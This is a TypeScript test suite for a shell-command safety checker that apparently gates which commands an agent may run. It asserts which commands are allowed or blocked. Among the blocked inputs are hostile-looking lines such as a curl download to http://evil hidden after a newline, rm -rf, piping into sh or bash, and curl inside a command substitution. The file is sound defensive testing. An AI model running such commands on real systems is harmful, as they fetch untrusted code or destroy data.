import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  isSafeCommand,
  splitOnShellOperators,
  getXargsCommand,
  expandVars,
  extractCommandSubstitutions,
} from "../src/safety.js";
import {
  DEFAULT_SAFE_PREFIXES,
  DEFAULT_DANGEROUS_PATTERNS,
  DEFAULT_SEGMENT_DANGEROUS_PATTERNS,
} from "../src/config.js";

const defaultRegexes = DEFAULT_DANGEROUS_PATTERNS.map((p) => new RegExp(p));
const defaultSegmentRegexes = DEFAULT_SEGMENT_DANGEROUS_PATTERNS.map((p) => new RegExp(p));

function safe(cmd: string) {
  return isSafeCommand(cmd, DEFAULT_SAFE_PREFIXES, defaultRegexes, defaultSegmentRegexes);
}

// ---------------------------------------------------------------------------
// splitOnShellOperators
// ---------------------------------------------------------------------------
describe("splitOnShellOperators", () => {
  it("splits on pipe", () => {
    assert.deepEqual(splitOnShellOperators("ls | grep foo"), ["ls ", " grep foo"]);
  });

  it("splits on &&", () => {
    assert.deepEqual(splitOnShellOperators("ls && cat x"), ["ls ", " cat x"]);
  });

  it("splits on ||", () => {
    assert.deepEqual(splitOnShellOperators("ls || echo fail"), ["ls ", " echo fail"]);
  });

  it("splits on ;", () => {
    assert.deepEqual(splitOnShellOperators("ls; cat x"), ["ls", " cat x"]);
  });

  it("does not split inside single quotes", () => {
    assert.deepEqual(splitOnShellOperators("grep 'foo|bar' file"), ["grep 'foo|bar' file"]);
  });

  it("does not split inside double quotes", () => {
    assert.deepEqual(
      splitOnShellOperators('grep "foo&&bar" file'),
      ['grep "foo&&bar" file'],
    );
  });

  it("handles mixed quoting and operators", () => {
    const result = splitOnShellOperators("grep 'a|b' f | cat");
    assert.equal(result.length, 2);
    assert.equal(result[0], "grep 'a|b' f ");
    assert.equal(result[1], " cat");
  });
});

// ---------------------------------------------------------------------------
// getXargsCommand
// ---------------------------------------------------------------------------
describe("getXargsCommand", () => {
  it("returns null for bare xargs (no command)", () => {
    assert.equal(getXargsCommand("xargs"), null);
  });

  it("returns the command after xargs flags", () => {
    assert.equal(getXargsCommand("xargs -n 1 grep"), "grep");
  });

  it("handles combined flags like -n1", () => {
    assert.equal(getXargsCommand("xargs -n1 cat"), "cat");
  });

  it("handles -I with placeholder", () => {
    assert.equal(getXargsCommand("xargs -I {} ls"), "ls");
  });

  it("returns null when only flags given", () => {
    assert.equal(getXargsCommand("xargs -n 5"), null);
  });

  it("returns the command for --flag=value form", () => {
    assert.equal(getXargsCommand("xargs --max-args=2 cat"), "cat");
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- basic safe commands
// ---------------------------------------------------------------------------
describe("isSafeCommand", () => {
  it("allows bare safe prefix (ls)", () => {
    assert.equal(safe("ls"), true);
  });

  it("allows safe prefix with arguments (ls -la /tmp)", () => {
    assert.equal(safe("ls -la /tmp"), true);
  });

  it("allows backslash-newline continuation", () => {
    assert.equal(safe("grep \\\n-r foo ."), true);
  });

  it("splits on bare newline like ; (second line checked separately)", () => {
    assert.equal(safe("ls\ncat file"), true);
  });

  it("blocks unsafe command hidden after a newline", () => {
    assert.equal(safe("ls\ncurl -o /tmp/pwn http://evil"), false);
  });

  it("blocks bare-newline continuation of args (bash runs them as a command)", () => {
    assert.equal(safe("grep\n-r foo ."), false);
  });

  it("allows git status with extra args", () => {
    assert.equal(safe("git status --short"), true);
  });

  it("allows git log with flags", () => {
    assert.equal(safe("git log --oneline -n 10"), true);
  });

  it("allows cat with a path", () => {
    assert.equal(safe("cat src/index.ts"), true);
  });

  it("allows echo with text", () => {
    assert.equal(safe("echo hello"), true);
  });

  it("allows leading whitespace (trimmed)", () => {
    assert.equal(safe("  ls -la"), true);
  });

  // --- New safe prefixes ---
  it("allows sort", () => {
    assert.equal(safe("sort names.txt"), true);
  });

  it("allows uniq", () => {
    assert.equal(safe("uniq -c"), true);
  });

  it("allows jq", () => {
    assert.equal(safe("jq .name package.json"), true);
  });

  it("allows sed", () => {
    assert.equal(safe("sed -n 5p file.txt"), true);
  });

  it("allows diff", () => {
    assert.equal(safe("diff a.txt b.txt"), true);
  });

  it("allows true", () => {
    assert.equal(safe("true"), true);
  });

  it("allows : (colon no-op)", () => {
    assert.equal(safe(":"), true);
  });

  // --- env removed from safe prefixes ---
  it("blocks env (removed from safe prefixes)", () => {
    assert.equal(safe("env"), false);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- compound commands (pipes, &&, ||, ;)
// ---------------------------------------------------------------------------
describe("isSafeCommand -- compound commands", () => {
  it("allows safe pipe: ls | grep foo", () => {
    assert.equal(safe("ls | grep foo"), true);
  });

  it("allows safe &&: ls && cat file", () => {
    assert.equal(safe("ls && cat file"), true);
  });

  it("allows safe ||: ls || echo fail", () => {
    assert.equal(safe("ls || echo fail"), true);
  });

  it("allows safe ;: ls; cat file", () => {
    assert.equal(safe("ls; cat file"), true);
  });

  it("allows multi-pipe: grep foo bar | sort | uniq -c | head", () => {
    assert.equal(safe("grep foo bar | sort | uniq -c | head"), true);
  });

  it("allows mixed operators: ls && cat x | head -5 || echo done", () => {
    assert.equal(safe("ls && cat x | head -5 || echo done"), true);
  });

  it("blocks compound if any segment is unsafe: ls | npm install", () => {
    assert.equal(safe("ls | npm install"), false);
  });

  it("blocks compound if any segment is unsafe: grep foo && curl http://x", () => {
    assert.equal(safe("grep foo && curl http://x"), false);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- stderr redirects allowed, stdout redirects blocked
// ---------------------------------------------------------------------------
describe("isSafeCommand -- redirects", () => {
  it("allows 2>/dev/null", () => {
    assert.equal(safe("ls 2>/dev/null"), true);
  });

  it("allows 2>&1 in a pipe", () => {
    assert.equal(safe("grep foo bar 2>&1 | head"), true);
  });

  it("blocks stdout redirect >", () => {
    assert.equal(safe("echo hi > file.txt"), false);
  });

  it("blocks stdout append >>", () => {
    assert.equal(safe("echo hi >> file.txt"), false);
  });

  it("blocks 1> redirect", () => {
    assert.equal(safe("echo hi 1> file.txt"), false);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- segment dangerous patterns
// ---------------------------------------------------------------------------
describe("isSafeCommand -- segment dangerous patterns", () => {
  it("blocks sh as a command in a pipe", () => {
    assert.equal(safe("echo script | sh"), false);
  });

  it("blocks bash as a command in a pipe", () => {
    assert.equal(safe("echo script | bash"), false);
  });

  it("blocks exec as a command", () => {
    assert.equal(safe("exec ls"), false);
  });

  it("blocks find -exec", () => {
    assert.equal(safe("find . -name '*.ts' -exec cat {} ;"), false);
  });

  it("blocks find -delete", () => {
    assert.equal(safe("find . -name '*.tmp' -delete"), false);
  });

  it("does NOT false-positive on .sh in filenames", () => {
    assert.equal(safe("git show HEAD:deploy.sh"), true);
  });

  it("does NOT false-positive on .sh in grep args", () => {
    assert.equal(safe("grep -l bash *.sh"), true);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- global dangerous patterns
// ---------------------------------------------------------------------------
describe("isSafeCommand -- global dangerous patterns", () => {
  it("blocks rm command", () => {
    assert.equal(safe("rm -rf /tmp/foo"), false);
  });

  it("blocks backtick substitution", () => {
    assert.equal(safe("echo `whoami`"), false);
  });

  it("allows $() substitution with a safe inner command", () => {
    assert.equal(safe("echo $(whoami)"), true);
  });

  it("blocks $() substitution with an unsafe inner command", () => {
    assert.equal(safe("echo $(python x.py)"), false);
  });

  it("blocks sudo", () => {
    assert.equal(safe("sudo ls"), false);
  });

  it("blocks eval", () => {
    assert.equal(safe("eval something"), false);
  });

  it("blocks source", () => {
    assert.equal(safe("source ~/.bashrc"), false);
  });

  it("blocks rm in a compound command", () => {
    assert.equal(safe("ls && rm foo"), false);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- xargs handling
// ---------------------------------------------------------------------------
describe("isSafeCommand -- xargs", () => {
  it("allows bare xargs in a pipe (uses echo by default)", () => {
    assert.equal(safe("find . -name '*.ts' | xargs"), true);
  });

  it("allows xargs with safe command: xargs grep foo", () => {
    assert.equal(safe("find . | xargs grep foo"), true);
  });

  it("allows xargs with flags and safe command: xargs -n 1 cat", () => {
    assert.equal(safe("find . | xargs -n 1 cat"), true);
  });

  it("blocks xargs with unsafe command: xargs rm", () => {
    assert.equal(safe("find . | xargs rm"), false);
  });

  it("blocks xargs with unknown command: xargs python", () => {
    assert.equal(safe("find . | xargs python"), false);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- quoted strings should not cause false splits
// ---------------------------------------------------------------------------
describe("isSafeCommand -- quoted strings", () => {
  it("allows grep with pipe in single-quoted pattern", () => {
    assert.equal(safe("grep 'foo\\|bar' file.txt"), true);
  });

  it("allows awk with pipe in single-quoted program", () => {
    // awk itself is not in safe prefixes, so this should be blocked
    assert.equal(safe("awk '{print $1|\"sort\"}'"), false);
  });
});

// ---------------------------------------------------------------------------
// isSafeCommand -- custom prefixes / regexes
// ---------------------------------------------------------------------------
describe("isSafeCommand -- custom prefixes / regexes", () => {
  it("allows a custom safe prefix", () => {
    assert.equal(isSafeCommand("docker ps", ["docker ps"], [], []), true);
  });

  it("blocks a command matching a custom dangerous regex", () => {
    assert.equal(
      isSafeCommand("ls", DEFAULT_SAFE_PREFIXES, [/ls/], []),
      false,
    );
  });

  it("blocks a command matching a custom segment dangerous regex", () => {
    assert.equal(
      isSafeCommand("ls | cat", DEFAULT_SAFE_PREFIXES, [], [/^cat\b/]),
      false,
    );
  });

  it("safe returns false for empty string", () => {
    assert.equal(safe(""), false);
  });
});

// ---------------------------------------------------------------------------
// New safe prefixes (branch additions)
// ---------------------------------------------------------------------------
describe("isSafeCommand -- new safe prefixes", () => {
  it("allows cd", () => {
    assert.equal(safe("cd /tmp"), true);
  });

  it("allows bare cd", () => {
    assert.equal(safe("cd"), true);
  });

  it("allows basename", () => {
    assert.equal(safe("basename /foo/bar.txt"), true);
  });

  it("allows dirname", () => {
    assert.equal(safe("dirname /foo/bar.txt"), true);
  });

  it("allows realpath", () => {
    assert.equal(safe("realpath ."), true);
  });

  it("allows readlink", () => {
    assert.equal(safe("readlink -f /usr/bin/node"), true);
  });

  it("allows id", () => {
    assert.equal(safe("id"), true);
  });

  it("allows hostname", () => {
    assert.equal(safe("hostname"), true);
  });

  it("allows md5sum", () => {
    assert.equal(safe("md5sum file.txt"), true);
  });

  it("allows sha256sum", () => {
    assert.equal(safe("sha256sum file.txt"), true);
  });

  it("allows git blame", () => {
    assert.equal(safe("git blame src/index.ts"), true);
  });

  it("allows git ls-files", () => {
    assert.equal(safe("git ls-files"), true);
  });
});

// ---------------------------------------------------------------------------
// New segment dangerous patterns (fd exec, sort -o)
// ---------------------------------------------------------------------------
describe("isSafeCommand -- new segment dangerous patterns", () => {
  it("blocks fd -x (exec)", () => {
    assert.equal(safe("find . | fd -x rm"), false);
  });

  it("blocks fd -X (exec-batch)", () => {
    assert.equal(safe("find . | fd -X rm"), false);
  });

  it("blocks fd --exec", () => {
    assert.equal(safe("find . | fd --exec rm"), false);
  });

  it("blocks fd --exec-batch", () => {
    assert.equal(safe("find . | fd --exec-batch rm"), false);
  });

  it("blocks sort -o (output to file)", () => {
    assert.equal(safe("sort -o output.txt input.txt"), false);
  });

  it("blocks sort --output (output to file)", () => {
    assert.equal(safe("sort --output sorted.txt input.txt"), false);
  });

  it("allows plain sort (no -o)", () => {
    assert.equal(safe("sort names.txt"), true);
  });

  it("allows sort -r (not -o)", () => {
    assert.equal(safe("sort -r names.txt"), true);
  });
});

// ---------------------------------------------------------------------------
// cd tracking and relative command resolution
// ---------------------------------------------------------------------------
describe("isSafeCommand -- cd tracking", () => {
  const scriptPrefixes = [
    ...DEFAULT_SAFE_PREFIXES,
    "/skills/phab/scripts/conduit.sh user.whoami",
    "/skills/phab/scripts/phab-get.sh",
  ];
  function safeWith(cmd: string) {
    return isSafeCommand(cmd, scriptPrefixes, defaultRegexes, defaultSegmentRegexes);
  }

  it("allows cd && relative allowlisted script", () => {
    assert.equal(safeWith("cd /skills/phab/scripts && ./conduit.sh user.whoami | head -5 && date"), true);
  });

  it("allows ../ resolution", () => {
    assert.equal(safeWith("cd /skills/phab/scripts/sub && ../phab-get.sh T123"), true);
    assert.equal(safeWith("cd /skills/phab/other && cd ../scripts && ./phab-get.sh T123"), true);
  });

  it("allows relative cd chained from absolute cd", () => {
    assert.equal(safeWith("cd /skills/phab && cd scripts && ./phab-get.sh T123"), true);
  });

  it("allows cd to a var-expanded literal dir", () => {
    assert.equal(safeWith("D=/skills/phab/scripts; cd $D && ./phab-get.sh T123"), true);
  });

  it("survives intermediate && segments", () => {
    assert.equal(safeWith("cd /skills/phab/scripts && ls && ./phab-get.sh T123"), true);
  });

  it("blocks relative script after ; (cd may have failed)", () => {
    assert.equal(safeWith("cd /skills/phab/scripts; ./phab-get.sh T123"), false);
  });

  it("blocks relative script when cd ran in a pipeline subshell", () => {
    assert.equal(safeWith("echo x | cd /skills/phab/scripts && ./phab-get.sh T123"), false);
  });

  it("blocks relative script when cd is || fallback (may be skipped)", () => {
    assert.equal(safeWith("ls || cd /skills/phab/scripts && ./phab-get.sh T123"), false);
  });

  it("blocks relative script after cd to unknown variable", () => {
    assert.equal(safeWith("cd $UNKNOWN && ./phab-get.sh T123"), false);
  });

  it("blocks relative script after cd to substitution result", () => {
    assert.equal(safeWith("cd $(pwd) && ./phab-get.sh T123"), false);
  });

  it("blocks relative cd without a known base", () => {
    assert.equal(safeWith("cd scripts && ./phab-get.sh T123"), false);
  });

  it("blocks relative script with no cd at all", () => {
    assert.equal(safeWith("./phab-get.sh T123"), false);
  });

  it("blocks relative script after newline (separator, not &&)", () => {
    assert.equal(safeWith("cd /skills/phab/scripts\n./phab-get.sh T123"), false);
  });

  it("does not resolve to a non-allowlisted path", () => {
    assert.equal(safeWith("cd /elsewhere && ./phab-get.sh T123"), false);
  });
});

// ---------------------------------------------------------------------------
// cd tracking with fs-verified directories (isExecutableDir)
// ---------------------------------------------------------------------------
describe("isSafeCommand -- verified cd survives ;", () => {
  const scriptPrefixes = [...DEFAULT_SAFE_PREFIXES, "/skills/phab/scripts/phab-get.sh"];
  const verifiedDirs = new Set(["/skills/phab", "/skills/phab/scripts"]);
  const opts = { isExecutableDir: (p: string) => verifiedDirs.has(p) };
  function safeWith(cmd: string, o = opts) {
    return isSafeCommand(cmd, scriptPrefixes, defaultRegexes, defaultSegmentRegexes, o);
  }

  it("keeps verified cwd across ;", () => {
    assert.equal(safeWith("cd /skills/phab/scripts && echo x; ./phab-get.sh T123"), true);
  });

  it("keeps verified cwd across multiple ; and newlines", () => {
    assert.equal(
      safeWith("cd /skills/phab/scripts && W=x; echo $W\n./phab-get.sh T123"),
      true,
    );
  });

  it("keeps verified cwd through a relative cd chain", () => {
    assert.equal(safeWith("cd /skills/phab && cd scripts; ./phab-get.sh T123"), true);
  });

  it("drops unverified cwd at ;", () => {
    assert.equal(safeWith("cd /skills/phab/other && echo x; ./phab-get.sh T123"), false);
  });

  it("drops cwd at ; when no checker is provided", () => {
    assert.equal(safeWith("cd /skills/phab/scripts && echo x; ./phab-get.sh T123", {}), false);
  });

  it("still drops verified cwd at |", () => {
    assert.equal(safeWith("cd /skills/phab/scripts && ls | ./phab-get.sh T123"), false);
  });

  it("still drops verified cwd at ||", () => {
    assert.equal(safeWith("cd /skills/phab/scripts && ls || ./phab-get.sh T123"), false);
  });

  it("still ignores cd in a pipeline subshell even when verified", () => {
    assert.equal(safeWith("echo x | cd /skills/phab/scripts && ./phab-get.sh T123"), false);
  });
});

// ---------------------------------------------------------------------------
// Command substitutions
// ---------------------------------------------------------------------------
describe("extractCommandSubstitutions", () => {
  it("extracts a simple span", () => {
    const spans = extractCommandSubstitutions("echo $(date)")!;
    assert.equal(spans.length, 1);
    assert.equal(spans[0].inner, "date");
  });

  it("extracts multiple spans", () => {
    const spans = extractCommandSubstitutions("echo $(date) $(pwd)")!;
    assert.deepEqual(spans.map((s) => s.inner), ["date", "pwd"]);
  });

  it("keeps nested substitutions inside the outer span", () => {
    const spans = extractCommandSubstitutions("echo $(echo $(date))")!;
    assert.equal(spans.length, 1);
    assert.equal(spans[0].inner, "echo $(date)");
  });

  it("ignores $() inside single quotes", () => {
    assert.deepEqual(extractCommandSubstitutions("grep '$(x)' f"), []);
  });

  it("detects $() inside double quotes", () => {
    const spans = extractCommandSubstitutions('echo "now: $(date)"')!;
    assert.equal(spans.length, 1);
    assert.equal(spans[0].inner, "date");
  });

  it("handles quoted parens inside the substitution", () => {
    const spans = extractCommandSubstitutions("echo $(echo ')')")!;
    assert.equal(spans.length, 1);
    assert.equal(spans[0].inner, "echo ')'");
  });

  it("returns null for unbalanced substitution", () => {
    assert.equal(extractCommandSubstitutions("echo $(date"), null);
  });
});

describe("isSafeCommand -- command substitutions", () => {
  const scriptPrefixes = [...DEFAULT_SAFE_PREFIXES, "/skills/phab/scripts/phab-search.sh"];
  function safeWith(cmd: string) {
    return isSafeCommand(cmd, scriptPrefixes, defaultRegexes, defaultSegmentRegexes);
  }

  it("allows safe substitution in an argument", () => {
    assert.equal(safeWith("echo $(date +%s)"), true);
  });

  it("allows safe substitution in an assignment", () => {
    assert.equal(safeWith("WEEK=$(date +%s); ls"), true);
  });

  it("allows compound inner command with stderr redirect", () => {
    assert.equal(
      safeWith(
        `S=/skills/phab/scripts; WEEK=$(date -d 'last monday' +%s 2>/dev/null || date -d '-7 days' +%s); ` +
          `$S/phab-search.sh differential.revision.search --constraints "{\\"modifiedStart\\":$WEEK}" --limit 30`,
      ),
      true,
    );
  });

  it("allows nested safe substitutions", () => {
    assert.equal(safeWith("echo $(echo $(date))"), true);
  });

  it("blocks unsafe inner command", () => {
    assert.equal(safeWith("echo $(curl http://x)"), false);
  });

  it("blocks rm inside substitution", () => {
    assert.equal(safeWith("echo $(rm -rf /tmp/x)"), false);
  });

  it("blocks nested unsafe substitution", () => {
    assert.equal(safeWith("echo $(echo $(curl http://x))"), false);
  });

  it("blocks substitution used as the command word", () => {
    assert.equal(safeWith("$(cat cmd.txt) --help"), false);
  });

  it("blocks inner stdout redirect", () => {
    assert.equal(safeWith("echo $(date > /tmp/f)"), false);
  });

  it("blocks empty substitution", () => {
    assert.equal(safeWith("echo $()"), false);
  });

  it("blocks unbalanced substitution", () => {
    assert.equal(safeWith("echo $(date"), false);
  });

  it("blocks arithmetic expansion (inner is not a command)", () => {
    assert.equal(safeWith("echo $((1+2))"), false);
  });

  it("still blocks literal $( in single quotes (existing behavior)", () => {
    assert.equal(safeWith("grep '$(x)' f"), false);
  });

  it("still blocks backticks", () => {
    assert.equal(safeWith("echo `date`"), false);
  });
});

// ---------------------------------------------------------------------------
// Variable assignments and expansion
// ---------------------------------------------------------------------------
describe("expandVars", () => {
  it("expands $NAME", () => {
    assert.equal(expandVars("$D/tool.sh", new Map([["D", "/x"]])), "/x/tool.sh");
  });

  it("expands ${NAME}", () => {
    assert.equal(expandVars("${D}/tool.sh", new Map([["D", "/x"]])), "/x/tool.sh");
  });

  it("does not expand longer names sharing a prefix", () => {
    assert.equal(expandVars("$DIR/tool.sh", new Map([["D", "/x"]])), "$DIR/tool.sh");
  });

  it("leaves unknown variables untouched", () => {
    assert.equal(expandVars("$OTHER/tool.sh", new Map([["D", "/x"]])), "$OTHER/tool.sh");
  });
});

describe("isSafeCommand -- variable assignments", () => {
  const scriptPrefixes = [...DEFAULT_SAFE_PREFIXES, "/skills/phab/scripts/phab-get.sh"];
  function safeWith(cmd: string) {
    return isSafeCommand(cmd, scriptPrefixes, defaultRegexes, defaultSegmentRegexes);
  }

  it("allows assignment + expanded safe command", () => {
    assert.equal(safeWith("D=/skills/phab/scripts; $D/phab-get.sh T123"), true);
  });

  it("allows ${NAME} expansion form", () => {
    assert.equal(safeWith("D=/skills/phab/scripts; ${D}/phab-get.sh T123"), true);
  });

  it("allows assignment + multiple expanded segments", () => {
    assert.equal(
      safeWith("D=/skills/phab/scripts; $D/phab-get.sh T123 | head -5; $D/phab-get.sh D456"),
      true,
    );
  });

  it("allows expansion in arguments of safe commands", () => {
    assert.equal(safeWith("F=/tmp/out.json; cat $F"), true);
  });

  it("allows a pure assignment command", () => {
    assert.equal(safeWith("D=/skills/phab/scripts"), true);
  });

  it("blocks expansion resolving to a non-safe command", () => {
    assert.equal(safeWith("D=/usr/bin; $D/python x.py"), false);
  });

  it("blocks unknown variable as command", () => {
    assert.equal(safeWith("$UNDEFINED/phab-get.sh T123"), false);
  });

  it("blocks assignment with command substitution (global $( check)", () => {
    assert.equal(safeWith("D=$(pwd); $D/phab-get.sh T123"), false);
  });

  it("blocks assignment with backticks (global check)", () => {
    assert.equal(safeWith("D=`pwd`; ls $D"), false);
  });

  it("does not treat quoted values as assignments", () => {
    assert.equal(safeWith("D='/skills/phab/scripts'; $D/phab-get.sh T123"), false);
  });

  it("does not treat values with spaces as assignments", () => {
    assert.equal(safeWith("D=/a b; ls"), false);
  });

  it("blocks rm even via expansion (global check)", () => {
    assert.equal(safeWith("D=/bin; ls && rm foo"), false);
  });
});

// ---------------------------------------------------------------------------
// PREFIX_DANGEROUS_FLAGS (git branch, git remote, git tag)
// ---------------------------------------------------------------------------
describe("isSafeCommand -- prefix dangerous flags", () => {
  // git branch
  it("allows git branch (list)", () => {
    assert.equal(safe("git branch"), true);
  });

  it("allows git branch -a", () => {
    assert.equal(safe("git branch -a"), true);
  });

  it("allows git branch -r", () => {
    assert.equal(safe("git branch -r"), true);
  });

  it("blocks git branch -d", () => {
    assert.equal(safe("git branch -d feature"), false);
  });

  it("blocks git branch -D", () => {
    assert.equal(safe("git branch -D feature"), false);
  });

  it("blocks git branch -m", () => {
    assert.equal(safe("git branch -m old new"), false);
  });

  it("blocks git branch -M", () => {
    assert.equal(safe("git branch -M old new"), false);
  });

  it("blocks git branch -c", () => {
    assert.equal(safe("git branch -c old new"), false);
  });

  it("blocks git branch -C", () => {
    assert.equal(safe("git branch -C old new"), false);
  });

  // git remote
  it("allows git remote (list)", () => {
    assert.equal(safe("git remote"), true);
  });

  it("allows git remote -v", () => {
    assert.equal(safe("git remote -v"), true);
  });

  it("blocks git remote add", () => {
    assert.equal(safe("git remote add origin url"), false);
  });

  it("blocks git remote remove", () => {
    assert.equal(safe("git remote remove origin"), false);
  });

  it("blocks git remote rename", () => {
    assert.equal(safe("git remote rename origin upstream"), false);
  });

  it("blocks git remote set-url", () => {
    assert.equal(safe("git remote set-url origin newurl"), false);
  });

  // git tag
  it("allows git tag (list)", () => {
    assert.equal(safe("git tag"), true);
  });

  it("allows git tag -l", () => {
    assert.equal(safe("git tag -l 'v*'"), true);
  });

  it("blocks git tag -d", () => {
    assert.equal(safe("git tag -d v1.0"), false);
  });

  it("blocks git tag -f", () => {
    assert.equal(safe("git tag -f v1.0"), false);
  });
});
